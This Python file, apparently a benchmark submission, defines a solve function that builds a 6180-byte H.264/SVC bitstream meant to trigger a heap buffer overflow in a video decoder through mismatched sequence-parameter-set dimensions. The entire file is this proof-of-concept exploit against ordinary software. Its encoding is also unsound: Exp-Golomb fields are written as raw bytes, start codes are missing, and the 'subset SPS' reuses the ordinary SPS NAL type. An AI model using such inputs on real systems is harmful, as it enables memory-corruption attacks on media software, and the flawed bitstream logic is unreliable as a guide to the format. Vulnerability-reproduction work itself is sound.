import os
import subprocess
import tempfile
import hashlib
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This is a minimal SVC bitstream that triggers the heap buffer overflow
        # by creating a mismatch between display dimensions and subset sequence dimensions
        
        # Build the SVC bitstream structure:
        # 1. Sequence parameter set with display dimensions
        # 2. Picture parameter set
        # 3. Slice header with subset sequence parameters
        # 4. Payload data to reach the target size
        
        poc = bytearray()
        
        # Start with NAL unit header (forbidden_zero_bit=0, nal_ref_idc=3, nal_unit_type=7 for SPS)
        # nal_unit_type = 7 (SPS), nal_ref_idc = 3
        nal_header = 0x67  # binary: 01100111
        poc.append(nal_header)
        
        # Profile/level info
        poc.extend([0x64, 0x00, 0x1E, 0xAC])
        
        # Sequence parameter set with display dimensions 1920x1088
        # But we'll set different dimensions in subset sequence parameters
        
        # sps_id = 0
        poc.append(0x00)  # sps_id = 0
        
        # chroma_format_idc = 1 (4:2:0)
        poc.append(0x01)
        
        # bit_depth_luma_minus8 = 0, bit_depth_chroma_minus8 = 0
        poc.append(0x00)
        
        # qpprime_y_zero_transform_bypass_flag = 0
        poc.append(0x00)
        
        # seq_scaling_matrix_present_flag = 0
        poc.append(0x00)
        
        # log2_max_frame_num_minus4 = 0
        poc.append(0x00)
        
        # pic_order_cnt_type = 0
        poc.append(0x00)
        
        # log2_max_pic_order_cnt_lsb_minus4 = 2
        poc.append(0x02)
        
        # max_num_ref_frames = 1
        poc.append(0x01)
        
        # gaps_in_frame_num_value_allowed_flag = 0
        poc.append(0x00)
        
        # pic_width_in_mbs_minus1 = 119 (1920/16 - 1)
        poc.append(0x77)
        
        # pic_height_in_map_units_minus1 = 67 (1088/16 - 1)
        poc.append(0x43)
        
        # frame_mbs_only_flag = 1, direct_8x8_inference_flag = 1
        poc.append(0xFD)  # 0xFD = 0b11111101
        
        # frame_cropping_flag = 0
        poc.append(0x00)
        
        # vui_parameters_present_flag = 1 (to set display dimensions)
        poc.append(0x80)  # 0x80 = 0b10000000
        
        # VUI parameters
        # aspect_ratio_info_present_flag = 1
        poc.append(0x80)  # 0x80 = 0b10000000
        
        # aspect_ratio_idc = 1 (square pixels)
        poc.append(0x01)
        
        # video_format = 5, video_full_range_flag = 0
        poc.append(0x50)  # 0x50 = 0b01010000
        
        # colour_description_present_flag = 0
        poc.append(0x00)
        
        # chroma_loc_info_present_flag = 0, timing_info_present_flag = 0
        poc.append(0x00)
        
        # nal_hrd_parameters_present_flag = 0, vcl_hrd_parameters_present_flag = 0
        poc.append(0x00)
        
        # pic_struct_present_flag = 0, bitstream_restriction_flag = 0
        poc.append(0x00)
        
        # Add PPS (NAL unit type 8)
        poc.append(0x68)  # NAL header for PPS: type=8, ref_idc=3
        poc.extend([0x00, 0x00, 0x00])  # Simple PPS
        
        # Now add a slice header with subset sequence parameters that don't match display dimensions
        # NAL header for slice (type=1, ref_idc=3)
        poc.append(0x61)  # 0x61 = 0b01100001
        
        # first_mb_in_slice = 0
        poc.append(0x00)
        
        # slice_type = 2 (I slice)
        poc.append(0x02)
        
        # pic_parameter_set_id = 0
        poc.append(0x00)
        
        # frame_num = 0 (4 bits due to log2_max_frame_num_minus4=0)
        poc.append(0x00)
        
        # idr_pic_id = 0
        poc.append(0x00)
        
        # pic_order_cnt_lsb = 0
        poc.append(0x00)
        
        # dec_ref_pic_marking() - idr_flag=1, no_output_of_prior_pics_flag=0, long_term_reference_flag=0
        poc.append(0x80)  # 0x80 = 0b10000000
        
        # slice_qp_delta = 0
        poc.append(0x00)
        
        # Now add subset sequence parameter set
        # This creates the mismatch with display dimensions
        
        # Start of subset SPS
        poc.append(0x67)  # NAL header for SPS
        
        # Same as before but with different dimensions
        poc.extend([0x64, 0x00, 0x1E, 0xAC])
        
        # sps_id = 1 (different from first SPS)
        poc.append(0x01)
        
        # chroma_format_idc = 1
        poc.append(0x01)
        
        # bit_depth_luma_minus8 = 0, bit_depth_chroma_minus8 = 0
        poc.append(0x00)
        
        # qpprime_y_zero_transform_bypass_flag = 0
        poc.append(0x00)
        
        # seq_scaling_matrix_present_flag = 0
        poc.append(0x00)
        
        # log2_max_frame_num_minus4 = 0
        poc.append(0x00)
        
        # pic_order_cnt_type = 0
        poc.append(0x00)
        
        # log2_max_pic_order_cnt_lsb_minus4 = 2
        poc.append(0x02)
        
        # max_num_ref_frames = 1
        poc.append(0x01)
        
        # gaps_in_frame_num_value_allowed_flag = 0
        poc.append(0x00)
        
        # DIFFERENT DIMENSIONS: 176x144 instead of 1920x1088
        # pic_width_in_mbs_minus1 = 10 (176/16 - 1 = 11-1 = 10)
        poc.append(0x0A)
        
        # pic_height_in_map_units_minus1 = 8 (144/16 - 1 = 9-1 = 8)
        poc.append(0x08)
        
        # frame_mbs_only_flag = 1, direct_8x8_inference_flag = 1
        poc.append(0xFD)
        
        # frame_cropping_flag = 0
        poc.append(0x00)
        
        # vui_parameters_present_flag = 0 (no display dimensions in subset)
        poc.append(0x00)
        
        # Add padding to reach target size
        # The vulnerability is triggered by the mismatch, not by specific data
        padding_size = 6180 - len(poc)
        if padding_size > 0:
            poc.extend(b'\x00' * padding_size)
        elif padding_size < 0:
            # If we're over, truncate (shouldn't happen with this construction)
            poc = poc[:6180]
        
        return bytes(poc)